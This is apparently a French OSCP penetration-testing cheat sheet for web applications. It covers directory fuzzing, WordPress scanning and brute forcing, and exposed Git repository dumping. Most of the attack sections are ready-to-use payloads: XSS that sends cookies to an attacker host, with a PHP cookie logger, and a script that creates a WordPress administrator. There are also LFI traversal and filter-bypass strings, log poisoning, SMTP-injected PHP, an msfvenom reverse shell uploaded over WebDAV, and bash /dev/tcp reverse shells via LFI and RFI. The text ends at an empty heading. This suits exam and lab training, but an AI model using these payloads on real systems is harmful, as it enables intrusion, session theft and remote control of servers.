---
title: "OSCP · Applications web"
description: "Examiner les fonctionnalités, entrées et configurations des applications web."
---

# OSCP · Applications web

Examiner les fonctionnalités, entrées et configurations des applications web.

### Identification des technologies

<p class="oscp-command-note">Identifier les technologies du site web.</p>

```bash
# Détecter les technologies utilisées par le site cible
whatweb -a 3 [TARGET_IP]

# Analyser les vulnérabilités potentielles et les erreurs de configuration du serveur
nikto -ask=no -h http://[TARGET_IP] 2>&1

whatweb -a 3 $IP
nikto -ask=no -h http://$IP 2>&1

# Lorsque vous trouvez un site Web HTTP, essayez toujours de faire un post sur les requêtes que vous trouvez pour voir ce qui se passe

# Afficher les informations du certificat TLS/SSL
openssl s_client -connect <target_domain>:443

```

<p class="oscp-command-note">Afficher les méthodes HTTP disponibles.</p>

```bash
# Lors de la découverte d'un site web HTTP, testez diverses méthodes HTTP pour identifier les vulnérabilités potentielles. Utilisez la commande suivante pour énumérer les méthodes autorisées :
curl -X OPTIONS http://[TARGET_IP] -i

# Ensuite, essayez les requêtes POST ou d'autres méthodes trouvées pour voir comment le serveur répond :
curl -X POST http://[TARGET_IP]/[endpoint] -d "test=data"

```

<p class="oscp-command-note">Identifier les technologies web.</p>

```bash
# Utiliser Wappalyser pour identifier les technologies et les cadres
wappalyzer --url http://[TARGET_IP]

# Utiliser BuildWith pour obtenir un profil technologique détaillé
builtwith [TARGET_IP]

# Analyser des informations supplémentaires en utilisant les en-têtes HTTP
curl -I http://[TARGET_IP]

```

#### FFUF

<p class="oscp-command-note">ffuf : rechercher les chemins et fichiers avec la liste de mots indiquée.</p>

```bash
# Fuzzing de répertoire de base
ffuf -w /path/to/wordlist.txt -u http://target/FUZZ

# Filtre pour afficher seulement 200 ou 3xx réponses
ffuf -w /path/to/wordlist.txt -u http://target/FUZZ -mc 200,300-399

# Résultats de sortie dans un fichier
ffuf -w /path/to/wordlist.txt -u http://target/FUZZ -o results.txt

# Recherche récursive de répertoires
ffuf -w /path/to/wordlist.txt -u http://target/FUZZ -recursion

# Définir le nombre de fils
ffuf -w /path/to/wordlist.txt -u http://target/FUZZ -t 50

# Utiliser un proxy
ffuf -w /path/to/wordlist.txt -u http://target/FUZZ -x http://127.0.0.1:8080

# Utiliser un délai entre les demandes
ffuf -w /path/to/wordlist.txt -u http://target/FUZZ -p 0.1-0.5

# Définir le délai de requête
ffuf -w /path/to/wordlist.txt -u http://target/FUZZ -timeout 10

# Match response size
ffuf -w /path/to/wordlist.txt -u http://target/FUZZ -fs 4242

# Exemple d’utilisation
ffuf -w /usr/share/wordlists/dirb/common.txt -u http://$IP/FUZZ
ffuf -w /usr/share/wordlists/dirb/big.txt -u http://$IP/FUZZ

```

#### DIRB

<p class="oscp-command-note">Rechercher des répertoires web avec DIRB.</p>

```bash
# Scan simple des répertoires
dirb http://target /path/to/wordlist.txt

# Enregistrer la sortie dans un fichier
dirb http://target /path/to/wordlist.txt -o results.txt

# Utiliser un agent utilisateur personnalisé
dirb http://target /path/to/wordlist.txt -a "Mozilla/5.0"

# Ignore non-existent pages
dirb http://target /path/to/wordlist.txt -N

# Analysez SSL (HTTPS)
dirb https://target /path/to/wordlist.txt

# Rechercher les répertoires récursivement
dirb http://target /path/to/wordlist.txt -r

# Exclude specific status codes
dirb http://target /path/to/wordlist.txt -n -X .php,.html,.txt

# Exemple d’utilisation
dirb http://target.com

```

#### GOBUSTER

<p class="oscp-command-note">Énumérer les répertoires ou sous-domaines avec Gobuster.</p>

```bash
# Scan simple des répertoires
gobuster dir -u http://target -w /path/to/wordlist.txt

# Filtre pour afficher seulement 200 réponses
gobuster dir -u http://target -w /path/to/wordlist.txt -s 200

# Spécifier les extensions
gobuster dir -u http://target -w /path/to/wordlist.txt -x php,html,txt

# Enregistrer la sortie dans un fichier
gobuster dir -u http://target -w /path/to/wordlist.txt -o results.txt

# Définir le nombre de fils
gobuster dir -u http://target -w /path/to/wordlist.txt -t 50

# Utiliser un proxy
gobuster dir -u http://target -w /path/to/wordlist.txt -p http://127.0.0.1:8080

# Exemple d’utilisation
gobuster dir -u http://10.11.1.71:80/site/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -e txt,php,html,htm
gobuster dir -u http://192.168.196.199 -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt -x pdf

```

#### FEROXBUSTER

<p class="oscp-command-note">Énumérer les chemins web avec Feroxbuster.</p>

```bash
# Fuzzing de répertoire de base
feroxbuster -u http://target -w /path/to/wordlist.txt -x php,html,txt

# Définir le nombre de threads, mode verbe, ignorer les erreurs de certificat
feroxbuster -u http://$IP -t 30 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x "txt,html,php,asp,aspx,jsp" -v -k -n -e 

# Codes de statut spécifiques au filtre
feroxbuster -u http://$IP -t 30 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x "txt,html,php,asp,aspx,jsp" -v -k -n -e -C 404 #ignore denied
feroxbuster -u http://$IP -t 30 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x "txt,html,php,asp,aspx,jsp" -v -k -n -e -C 404,302 #handle redirects

```

#### DIRSEARCH

<p class="oscp-command-note">Rechercher des chemins web avec dirsearch.</p>

```bash
# Scan simple des répertoires
dirsearch -u http://target -w /path/to/wordlist.txt

# Filtre pour afficher seulement 200 ou 3xx réponses
dirsearch -u http://target -w /path/to/wordlist.txt -i 200,300-399

# Spécifier les extensions
dirsearch -u http://target -w /path/to/wordlist.txt -e php,html,txt

# Enregistrer la sortie dans un fichier
dirsearch -u http://target -w /path/to/wordlist.txt -r -o results.txt

# Définir le nombre de fils
dirsearch -u http://target -w /path/to/wordlist.txt -t 50

# Utiliser un proxy
dirsearch -u http://target -w /path/to/wordlist.txt -x http://127.0.0.1:8080

# Ignore SSL certificate warnings
dirsearch -u https://target -w /path/to/wordlist.txt -k

# Exclude specific status codes
dirsearch -u http://target -w /path/to/wordlist.txt --exclude-status 404,403

# Exemple d’utilisation
dirsearch -u http://$IP/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-files.txt 
dirsearch -u http://$IP/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -t 300 --recursive --exclude-status=400,404,405,408

```

#### WFUZZ

<p class="oscp-command-note">Tester les paramètres web avec Wfuzz.</p>

```bash
# Rechercher les répertoires disponibles
wfuzz --hc 404 -c -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt http://<target_ip>/FUZZ

# Trouver les répertoires disponibles avec les cookies
wfuzz --hc 404 -c -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -H "cookie: <cookie_name>=<cookie_value>" http://<target_ip>/FUZZ

# Fuzz data parameters
wfuzz --hc 404 -c -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -d "id=FUZZ&catalogue=1" http://<target_ip>

# Subdomain enumeration
wfuzz --hc 404 -c -w /usr/share/amass/wordlists/subdomains-top1mil-110000.txt -H "HOST: FUZZ.<target_domain>" <target_domain>

# Énumérer les répertoires cachés
wfuzz --hc 404 -c -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt http://<target_ip>/.FUZZ

# Skip SSL Certificate validation
wfuzz --hc 404 -c -k -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt http://<target_ip>/FUZZ

# Utiliser des fils pour accélérer le processus (pas conseillé de dépasser 200)
wfuzz --hc 404 -c -t <number_of_threads> -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt http://<target_ip>/FUZZ

```

#### FFUF

<p class="oscp-command-note">ffuf : rechercher les chemins et fichiers avec la liste de mots indiquée.</p>

```bash
# Fuzzing de fichier de base
ffuf -w /path/to/wordlist.txt -u http://target/FUZZ

# Filtre pour afficher seulement 200 ou 3xx réponses
ffuf -w /path/to/wordlist.txt -u http://target/FUZZ -mc 200,300-399

# Spécifier les extensions
ffuf -w /path/to/wordlist.txt:FUZZ -u http://target/FUZZ.html,http://target/FUZZ.php -mc 200,300-399

# Résultats de sortie dans un fichier
ffuf -w /path/to/wordlist.txt -u http://target/FUZZ -o results.txt

# Définir le nombre de fils
ffuf -w /path/to/wordlist.txt -u http://target/FUZZ -t 50

# Utiliser un proxy
ffuf -w /path/to/wordlist.txt -u http://target/FUZZ -x http://127.0.0.1:8080

```

#### DIRB

<p class="oscp-command-note">Rechercher des répertoires web avec DIRB.</p>

```bash
# Analyse de fichier de base avec extensions par défaut
dirb http://target /path/to/wordlist.txt -X .php,.html,.txt

# Enregistrer la sortie dans un fichier
dirb http://target /path/to/wordlist.txt -X .php,.html,.txt -o results.txt

# Utiliser un agent utilisateur personnalisé
dirb http://target /path/to/wordlist.txt -X .php,.html,.txt -a "Mozilla/5.0"

# Ignore non-existent pages
dirb http://target /path/to/wordlist.txt -X .php,.html,.txt -N

# Analysez SSL (HTTPS)
dirb https://target /path/to/wordlist.txt -X .php,.html,.txt

```

#### GOBUSTER

<p class="oscp-command-note">Énumérer les répertoires ou sous-domaines avec Gobuster.</p>

```bash
# Recherche élémentaire de fichiers
gobuster dir -u http://target -w /path/to/wordlist.txt

# Filtre pour afficher seulement 200 réponses
gobuster dir -u http://target -w /path/to/wordlist.txt -s 200

# Spécifier les extensions
gobuster dir -u http://target -w /path/to/wordlist.txt -x php,html,txt

# Enregistrer la sortie dans un fichier
gobuster dir -u http://target -w /path/to/wordlist.txt -o results.txt

# Définir le nombre de fils
gobuster dir -u http://target -w /path/to/wordlist.txt -t 50

# Utiliser un proxy
gobuster dir -u http://target -w /path/to/wordlist.txt -p http://127.0.0.1:8080

```

#### FEROXBUSTER

<p class="oscp-command-note">Énumérer les chemins web avec Feroxbuster.</p>

```bash
# Recherche élémentaire de fichiers
feroxbuster -u http://target -w /path/to/wordlist.txt

# Filtre pour afficher seulement 200 réponses
feroxbuster -u http://target -w /path/to/wordlist.txt -s 200

# Spécifier les extensions
feroxbuster -u http://target -w /path/to/wordlist.txt -x php,html,txt

# Enregistrer la sortie dans un fichier
feroxbuster -u http://target -w /path/to/wordlist.txt -o results.txt

# Définir le nombre de fils
feroxbuster -u http://target -w /path/to/wordlist.txt -t 50

# Utiliser un proxy
feroxbuster -u http://target -w /path/to/wordlist.txt -p http://127.0.0.1:8080

# Exclude specific status codes
feroxbuster -u http://target -w /path/to/wordlist.txt -e php,html,txt -C 404,403

# Utiliser un agent utilisateur personnalisé
feroxbuster -u http://target -w /path/to/wordlist.txt -a "Mozilla/5.0"

```

#### DIRSEARCH

<p class="oscp-command-note">Rechercher des chemins web avec dirsearch.</p>

```bash
# Recherche élémentaire de fichiers
dirsearch -u http://target -w /path/to/wordlist.txt

# Filtre pour afficher seulement 200 ou 3xx réponses
dirsearch -u http://target -w /path/to/wordlist.txt -i 200,300-399

# Spécifier les extensions
dirsearch -u http://target -w /path/to/wordlist.txt -e php,html,txt

# Enregistrer la sortie dans un fichier
dirsearch -u http://target -w /path/to/wordlist.txt -r -o results.txt

# Définir le nombre de fils
dirsearch -u http://target -w /path/to/wordlist.txt -t 50

# Utiliser un proxy
dirsearch -u http://target -w /path/to/wordlist.txt -x http://127.0.0.1:8080

```

#### Observer les réponses HTTP

Examiner les en-têtes et les méthodes autorisées sans modifier l'application.

<p class="oscp-command-note">Observer les réponses HTTP.</p>

```bash
curl -I 'https://<HOTE_CIBLE>/'
curl -i -X OPTIONS 'https://<HOTE_CIBLE>/'
```

#### Explorer les chemins potentiels

Rechercher des chemins par dictionnaire, avec un nombre de requêtes conforme au périmètre d'audit.

<p class="oscp-command-note">Explorer les chemins potentiels.</p>

```bash
feroxbuster -u 'https://<HOTE_CIBLE>/' -w <LISTE_MOTS> --rate-limit 10
gobuster dir -u 'https://<HOTE_CIBLE>/' -w <LISTE_MOTS> -x php,txt,html
```

#### Contrôle de configuration web

Lancer les contrôles standards de Nikto ; vérifier ensuite chaque résultat manuellement.

<p class="oscp-command-note">Contrôle de configuration web.</p>

```bash
nikto -h 'https://<HOTE_CIBLE>/'
```

### Dépôt Git exposé

**Paramètres et repères :**
`.git` (métadonnées Git)  

<p class="oscp-command-note">Récupérer un répertoire Git exposé et rechercher des secrets dans les fichiers collectés.</p>

```bash
# Extraire le contenu d’un répertoire .git exposé
git-dumper http://[IP/Domain]/.git website_git

# Rechercher des secrets communs dans les fichiers sous-évalués
grep -r 'password' .
grep -r 'apikey' .

# Afficher un fichier spécifique qui peut contenir des identifiants ou des données sensibles
cat website_git/config/database.php

# Vérifiez le journal de validation
git log

# Puis pour vérifier le diff commit
git show [commitID]

```

**Paramètres et repères :**
`gitdumper.sh` · `extractor.sh`  

```bash
./gitdumper.sh http://[domain].com/.git/ /path/to/save/git

# Vérifier les dernières commits
cd /path/to/git && git status

# Lire le numéro de commit du sélecteur
git commit [commitNumber]

# Restore last commit
git reset --hard

# Script de récupération d'un dépôt Git exposé
./extractor.sh /.git/ extracted

```

#### Consulter les métadonnées Git exposées

Vérifier la présence d'un fichier de métadonnées .git/HEAD accessible par HTTP.

<p class="oscp-command-note">Consulter les métadonnées Git exposées.</p>

```bash
curl -i 'https://<HOTE_CIBLE>/.git/HEAD'
```

#### Collecte du dépôt exposé

Utiliser un récupérateur Git seulement si la collecte du code est autorisée. Éviter la diffusion des secrets éventuellement présents.

<p class="oscp-command-note">Collecte du dépôt exposé.</p>

```bash
git-dumper 'https://<HOTE_CIBLE>/.git/' <DOSSIER_SORTIE>
```

### Systèmes de gestion de contenu (CMS)

Examiner les entrées et les réponses de l'application web.

<p class="oscp-command-note">Examiner un site WordPress.</p>

```bash
# Effectuer un scan simple de WordPress
wpscan --url http://$IP/wp/

```

```bash
# Brute forcing WordPress login
wpscan --url http://$IP/wp/wp-login.php -U Admin --passwords /usr/share/wordlists/rockyou.txt --password-attack wp-login

```

```bash
# Examiner une installation WordPress
wpscan -u "http://<IP>/" --wp-content-dir "<custom-path>"

```

```bash
wpscan -u "http://<IP>/" --enumerate u

# Utilisation de la liste de mots
wpscan -u "http://<IP>/" --username <username> -w /usr/share/SecList/Usernames/xato-usernames-top-1millions-20000.txt

```

<p class="oscp-command-note">WordPress : référence de l'outil et exemple d'appel de wordpwn.py, à adapter au laboratoire.</p>

```bash
# Utilisation d'un plugin WordPress malveillant
https://github.com/wetw0rk/malicious-wordpress-plugin

# Usage
python3 wordpwn.py [LHOST] [LPORT] [HANDLER]

# Exemple
python3 wordpwn.py 192.168.119.140 443 Y

```

```bash
# Scanner Drupal CMS
droopescan scan drupal -u [TARGET_URL]

```

<p class="oscp-command-note">Télécharger une ressource distante.</p>

```bash
# Télécharger le répertoire .git si exposé
sudo wget -r http://[TARGET_IP]/.git/

# Déplacer dans le répertoire .git localement
cd [TARGET_IP]

# Afficher Git commet et révèle des informations sensibles
sudo git show

```

```text
# Location and version info

[+] Simple File List
| Location: http://[TARGET_IP]/wp-content/plugins/simple-file-list/
| Last Updated: [LAST_UPDATE]
| [!] The version is out of date; the latest version is [LATEST_VERSION]

# Exploiter pour une liste de fichiers simple < [VULNERABLE_VERSION] - Téléchargement arbitraire de fichiers non authentifiés

https://www.exploit-db.com/exploits/48979

```

```bash
cewl -w <dictionary-file> "http://<IP>/" --with-numbers

```

<p class="oscp-command-note">Examiner un site WordPress.</p>

```bash
# Detect vulnerable plugins
wpscan --url http(s)://<IP>/ --enumerate vp

# Detect all plugins
wpscan --url http(s)://<IP>/ --enumerate p

# Aggressive detection of all plugins
wpscan --url http(s)://<IP>/ --enumerate p --plugins-detection aggressive

```

#### WordPress : inventaire des extensions

Lister les extensions accessibles sans imposer un essai de mots de passe.

<p class="oscp-command-note">WordPress : inventaire des extensions.</p>

```bash
wpscan --url 'https://<HOTE_CIBLE>/' --enumerate ap --plugins-detection passive
```

### WebDAV

Examiner les entrées et les réponses de l'application web.

<p class="oscp-command-note">Exemple de résultat d’un scan WebDAV : sortie à analyser, pas une commande à exécuter.</p>

```bash
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-webdav-scan:
|   WebDAV type: Unknown
|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, POST, COPY, PROPFIND, DELETE, MOVE, PROPPATCH, MKCOL, LOCK, UNLOCK

```

```bash
# Utiliser le cadavre
cadaver [IP]

```

<p class="oscp-command-note">Créer un fichier de sortie avec msfvenom.</p>

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$IP LPORT=80 -f aspx -o shell.aspx

```

<p class="oscp-command-note">WebDAV : envoyer un fichier par HTTP PUT avec curl -T et des identifiants autorisés.</p>

```bash
curl -T 'shell.aspx' 'http://$VictimIP/' -u <username>:<password>

```

<p class="oscp-command-note">Netcat : lancer l'écoute locale sur le port de test.</p>

```bash
nc -nvlp 80

```

<p class="oscp-inline-ref"><strong>URL de référence :</strong> <code>http://$VictimIP/shell.aspx</code></p>
### Interfaces de programmation (API)

<p class="oscp-command-note">API : interroger le point d'entrée et examiner les chemins JSON retournés.</p>

```bash
# Exploration API de base
curl http://$IP/api/

# Exemple de sortie
[{"string":"/api/","id":13},{"string":"/article/","id":14},{"string":"/article/?","id":15},{"string":"/user/","id":16},{"string":"/user/?","id":17}] 

# Exemple de chemin d’API
/api_name/v1

# Interroger des points d’accès (endpoints) précis
curl http://$IP/api/user/ 

http://[IP]:[PORT]/search
{"query":"*","result":""}

curl -X GET "http://[IP]:[PORT]/search?query=*"
{"query":"*","result":""}

curl -X GET "http://[IP]:[PORT]/search?query=lol"
{"query":"lol","result":""}

# Utiliser -d pour les données et -H pour les en-têtes
curl -d '{"password":"fake","username":"admin"}' -H 'Content-Type: application/json'  http://[IP]:[PORT]/users/v1/login

# Passer aussi la requête par un proxy
--proxy 127.0.0.1:8080

```

#### Tester une API JSON

Définir explicitement l'en-tête Accept, puis examiner le statut et le type de réponse.

<p class="oscp-command-note">Tester une API JSON.</p>

```bash
curl -i -H 'Accept: application/json' 'https://<HOTE_CIBLE>/api/'
```

#### Examiner les réponses sans perdre les en-têtes

Sauvegarder le corps JSON et les en-têtes séparément pour le rapport.

<p class="oscp-command-note">Examiner les réponses sans perdre les en-têtes.</p>

```bash
curl -D <ENTETES>.txt -o <REPONSE>.json 'https://<HOTE_CIBLE>/api/'
```

### Listes de mots

<p class="oscp-inline-ref"><strong>Chemin de référence :</strong> <code>/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</code></p>
<p class="oscp-inline-ref"><strong>Chemin de référence :</strong> <code>/usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt</code></p>
<p class="oscp-inline-ref"><strong>Chemin de référence :</strong> <code>/usr/share/seclists/Discovery/Web-Content/common.txt</code></p>
**Paramètres et repères :**
`/usr/share/seclists/Discovery/Web-Content/big.txt`  

<p class="oscp-command-note">HTTP : examiner la réponse du serveur pour «Listes de mots».</p>

```bash
# Obtenir le contenu du site
curl http://example.com > example.txt

# Supprimer les entrées en double

# Créer le dictionnaire de mots
html2dic example.txt
# Autre possibilité
cewl -w createWordlist.txt https://www.example.com

# Améliorer la liste de mots avec les règles
john ---wordlist=wordlist.txt --rules --stdout > wordlist-modified.txt

```

## Injection de scripts intersites (XSS / Cross-Site Scripting)

Examiner les entrées et les réponses de l'application web.

### Principe

```text
< > ' " { } ;

```

**XSS stockée (Stored / persistante)**

**XSS réfléchie (Reflected / non persistante)**

**XSS fondée sur le DOM (DOM-Based)**

### XSS stockée (Stored XSS)

<p class="oscp-command-note">Extrait HTML : exemple technique pour «XSS stockée (Stored XSS)» (ce n'est pas une commande de terminal).</p>

```html
# Texte à enregistrer dans l'application.
<script>alert("XSS")</script>

<script>alert(document.cookie)</script>

<script>alert(window.origin)</script>

```

### XSS réfléchie (Reflected XSS)

```bash
http://[SERVER_IP]:[PORT]/index.php?task=%3Cscript%3Ealert(document.cookie)%3C/script%3E

```

![Reflected XSS Payload](https://www.emmanuelsolis.com/img/xss01.png)

![Reflected XSS Result](https://www.emmanuelsolis.com/img/xss02.png)

### XSS aveugle (Blind XSS)

<p class="oscp-command-note">Extrait HTML : exemple technique pour «XSS aveugle (Blind XSS)» (ce n'est pas une commande de terminal).</p>

```html
<script src=http://[OUR_IP]></script>

'><script src=http://[OUR_IP]></script>

<script>$.getScript("http://[OUR_IP]")</script>

"><script src=http://[OUR_IP]></script>
javascript:eval('var a=document.createElement(\'script\');a.src=\'http://OUR_IP\';document.body.appendChild(a)')
<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//OUR_IP");a.send();</script>

```

### Élévation de privilèges par détournement de session

<p class="oscp-command-note">Exemple HTML lié à l’élévation de privilèges par détournement de session.</p>

```html
# Exemples de charges utiles (Payloads)
document.location='http://OUR_IP/index.php?c='+document.cookie;
# Autre possibilité
new Image().src='http://OUR_IP/index.php?c='+document.cookie;

# Accéder à l’hôte cible
<script src=http://OUR_IP>/script.js</script>

```

<p class="oscp-command-note">Exemple PHP lié à l’élévation de privilèges par détournement de session.</p>

```php
# Payload
<img src=x onerror=fetch('http://10.10.14.37/'+document.cookie);>

# PHP Server Code
<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
?>

```

### Cookie HttpOnly dans WordPress (extension Visitor)

Examiner les entrées et les réponses de l'application web.

<p class="oscp-command-note">Extrait PHP : exemple technique pour «Cookie HttpOnly dans WordPress (extension Visitor)» (ce n'est pas une commande de terminal).</p>

```php
var request = new XMLHttpRequest();
var targetURL = "/wp-admin/user-new.php";
var regex = /name="([^"]*?)"/g;
request.open("GET", targetURL, false);
request.send();
var match = regex.exec(request.responseText);
var nonce = match[1];

```

```php
var params = "action=createuser&_wpnonce_create-user=" + nonce + "&user_login=newadmin&email=newadmin@example.com&pass1=newpassword&pass2=newpassword&role=administrator";
var request = new XMLHttpRequest();
request.open("POST", targetURL, true);
request.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
request.send(params);

```

```php
var params = "action=createuser&_wpnonce_create-user=" + nonce + "&user_login=newadmin&email=newadmin@example.com&pass1=newpassword&pass2=newpassword&role=administrator";
var request = new XMLHttpRequest();
request.open("POST", targetURL, true);
request.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
request.send(params);

```

<p class="oscp-command-note">Extrait JAVASCRIPT : exemple technique pour «Cookie HttpOnly dans WordPress (extension Visitor)» (ce n'est pas une commande de terminal).</p>

```javascript
function toJavaScriptEncoding(str) {
    var result = '';
    for (var i = 0; i < str.length; i++) {
        result += str.charCodeAt(i);
        if (i !== str.length - 1) {
            result += ",";
        }
    }
    return result;
}

let encodedPayload = toJavaScriptEncoding('insert_minified_javascript');
console.log(encodedPayload);

```

**Paramètres et repères :**
`eval`  

<p class="oscp-command-note">HTTP : acheminer la requête par un proxy.</p>

```bash
curl -i http://example.com --user-agent "<script>eval(String.fromCharCode(<resultFromRunningAboveScritpToEncode>))</script>" --proxy 127.0.0.1:8080

```

### Détection automatisée

<p class="oscp-command-note">Examiner les fichiers et l&#x27;historique Git.</p>

```bash
git clone https://github.com/s0md3v/XSStrike.git
cd XSStrike
pip install -r requirements.txt

python xsstrike.py -u "http://SERVER_IP:PORT/index.php?task=test"

```

**Paramètres et repères :**
`user-agent`  

<p class="oscp-command-note">ffuf : rechercher les chemins et fichiers avec la liste de mots indiquée.</p>

```bash
# [xss.req] est la requête capturée dans BurpSuite.
ffuf -ic -c -of csv -request-proto http -request [xss.req] -w XSS-RSNAKE.txt

```

## Inclusion des fichiers

Examiner les entrées et les réponses de l'application web.

### Inclusion de fichiers locaux (LFI)

Examiner les entrées et les réponses de l'application web.

#### Détection de LFI

<p class="oscp-inline-ref"><strong>URL de référence :</strong> <code>http://&lt;target_url&gt;/file.php?recurse=&lt;file_name&gt;</code></p>
<p class="oscp-command-note">ffuf : rechercher les chemins et fichiers avec la liste de mots indiquée.</p>

```bash
ffuf -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=FUZZ' -fs 2287

```

**Paramètres et repères :**
`GET`  

```bash
# Examiner les chemins ou paramètres avec FFUF
ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?FUZZ=value' -fs 2287

```

```bash
# Examiner les chemins ou paramètres avec FFUF
ffuf -w /opt/useful/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://<SERVER_IP>:<PORT>/FUZZ.php

```

**Paramètres et repères :**
`../../../../`  

```bash
# Examiner les chemins ou paramètres avec FFUF
ffuf -w /opt/useful/SecLists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ/index.php' -fs 2287

```

```bash
# Examiner les chemins ou paramètres avec FFUF
ffuf -w ./LFI-WordList-Linux:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ' -fs 2287

```

#### Contournement des protections LFI

<p class="oscp-command-note">Exemples de chemins et encodages LFI pour évaluer les filtres de l’application.</p>

```bash
# Test de contournement par encodage URL
http://<target_url>/file.php?recurse=../../../../../etc/passwd% 

# Test de contournement par octet nul
http://<target_url>/file.php?recurse=../../../../../etc/passwd?nullbyte

# Avoiding ..
http://<target_url>/file.php?recurse=.?/.?/.?/.?/.?/etc/passwd
http://<target_url>/file.php?recurse=.*/.*/.*/.*/.*/etc/passwd
http://<target_url>/file.php?recurse=.?/.?/.?/.?/.?/etc/passwd

# Double URL encoding
http://<target_url>/file.php?recurse=%252e%252e%252fetc%252fpasswd

# Contournement par répétition des barres obliques
http://<target_url>/file.php?recurse=....//....//....//etc/passwd

# Affichage d'un fichier avec injection d'octet nul
http://<target_url>/file.php?recurse=../../../../../etc/passwd%00

# Tester les restrictions d'extensions de fichiers
http://<target_url>/file.php?recurse=../../../../../etc/passwd%2500.jpg

# Récupérer les variables d'environnement du système
http://<target_url>/file.php?recurse=../../../../../proc/self/environ

```

#### Flux d’accès aux fichiers via LFI (Wrappers)

<p class="oscp-command-note">Lire le contenu d’un fichier avec un wrapper PHP, puis décoder la réponse Base64.</p>

```bash
http://<target_url>/file.php?recurse=php://filter/convert.base64-encode/resource=<file_name>

# Décoder la réponse encodée en Base64
echo "<BASE64_ENCODED_OUTPUT>" | base64 -d

```

```bash
http://<target_url>/file.php?recurse=php://filter/read=string.rot13/resource=<file_name>

```

<p class="oscp-command-note">HTTP : examiner la réponse du serveur pour «Flux d’accès aux fichiers via LFI (Wrappers)».</p>

```bash
curl "http://<TARGET>/index.php?page=php://filter/convert.base64-encode/resource=<FILE>"

```

##### Empoisonnement des journaux Apache ou SSH (Log Poisoning)

**Paramètres et repères :**
`/var/log/apache2/access.log` · `/var/log/auth.log`  

```bash
http://<target_url>/file.php?recurse=../../../../../var/log/apache2/access.log

```

<p class="oscp-command-note">Ouvrir une connexion SSH.</p>

```bash
ssh "<?php system('whoami'); ?>"@<target>

```

```bash
http://<target_url>/file.php?recurse=../../../../../var/log/auth.log

```

##### Exécution de PHP par courriel

Examiner les entrées et les réponses de l'application web.

**Paramètres et repères :**
`/etc/passwd`  

<p class="oscp-command-note">Tester la connexion à un port TCP.</p>

```bash
telnet <target_ip> 25

```

<p class="oscp-command-note">Dialogue SMTP dans une session Telnet déjà connectée, pas des commandes Bash.</p>

```text
HELO localhost
MAIL FROM:<root>
RCPT TO:<www-data>
DATA
<?php echo shell_exec($_REQUEST['cmd']); ?>
.

```

```bash
smtp-user-enum -M VRFY -U <username_list> -t <target_ip>

```

#### Shell inversé via LFI (Reverse Shell)

**Paramètres et repères :**
`/proc/self/environ`  

<p class="oscp-command-note">Envoyer une requête HTTP POST.</p>

```bash
curl -X POST -d "cmd=<?php system('bash -i >& /dev/tcp/<attacker_ip>/<port> 0>&1'); ?>" http://<target_url>/file.php?recurse=../../../../../proc/self/environ

```

```bash
http://<target_url>/file.php?recurse=../../../../../proc/self/environ

```

#### Outils pour analyser les requêtes et réponses HTTP

<p class="oscp-command-note">Examiner les fichiers et l&#x27;historique Git.</p>

```bash
git clone https://github.com/D35m0nd142/LFISuite

```

<p class="oscp-command-note">Exécuter rfiscanner.py avec les paramètres indiqués pour «Outils utiles».</p>

```bash
python rfiscanner.py <target_url>

```

#### Éviter la normalisation du chemin

Envoyer littéralement les segments de traversée lorsque le paramètre est placé dans le chemin de l'URL.

<p class="oscp-command-note">Éviter la normalisation du chemin.</p>

```bash
curl --path-as-is 'http://<HOTE_CIBLE>/../../../../etc/hostname'
```

### Inclusion de fichiers distants (RFI)

Examiner les entrées et les réponses de l'application web.

#### Exemple simple de RFI

```bash
# Cette technique nécessite que allow_url_fopen ou allow_url_include soit activé sur le serveur.
http://<target_url>/file.php?recurse=http://<attacker_ip>/malicious.php

```

#### Shell inversé via RFI

<p class="oscp-command-note">Démarrer un serveur HTTP local pour fournir des fichiers.</p>

```bash
python3 -m http.server 80

```

**Paramètres et repères :**
`revshell.php`  

<p class="oscp-command-note">Exemples distincts : code PHP du serveur et commande Bash du terminal.</p>

```text
# Option 1 : exemple de shell inversé via PHP.
<?php system($_GET['cmd']); ?>

# Option 2 : exemple de shell inversé via Bash.
bash -c "sh -i >& /dev/tcp/[LHOST]/[LPORT] 0>&1"

```

<p class="oscp-command-note">HTTP : examiner la réponse du serveur pour «Shell inversé via RFI».</p>

```bash
curl "http://<TARGET>/index.php?page=http://<ATTACKER_IP>/revshell.php&cmd=ls"

```

### Extension WordPress pour obtenir un shell inversé

